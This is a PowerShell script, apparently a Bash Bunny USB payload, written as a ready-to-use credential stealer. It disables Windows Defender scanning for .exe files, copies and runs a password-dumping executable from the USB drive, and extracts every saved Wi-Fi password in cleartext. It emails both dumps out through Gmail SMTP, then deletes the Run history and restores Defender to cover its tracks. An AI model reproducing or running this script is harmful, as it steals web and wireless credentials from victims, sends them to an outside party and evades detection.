# Author: Faisal

Set-MpPreference -ExclusionExtension .exe
cd C:\windows
mkdir sys-boot
$1=Get-WMIObject Win32_Volume | ? { $_.Label -eq 'BASHBUNNY' } | select name
cd $1.name
cd loot
cp 1.exe C:\windows\sys-boot


cd C:\windows\sys-boot
./1.exe /stext "C:\windows\sys-boot\web-creds.txt"
sleep 5
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >$env:UserName".txt"

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email', 'password')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'email'
$E.To.Add('the reviever email')
$E.Subject = $env:UserName
$E.Body = 'Web passwords'
$E.Attachments.Add("C:\windows\sys-boot\web-creds.txt")
$SMTPInfo.Send($E)


$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email', 'password')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'email'
$E.To.Add('the reviever email')
$E.Subject = $env:UserName
$E.Body = 'WIFI passwords'
$E.Attachments.Add("C:\windows\sys-boot\$env:UserName.txt")
$SMTPInfo.Send($E)

cd C:\
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
Remove-MpPreference -ExclusionExtension .exe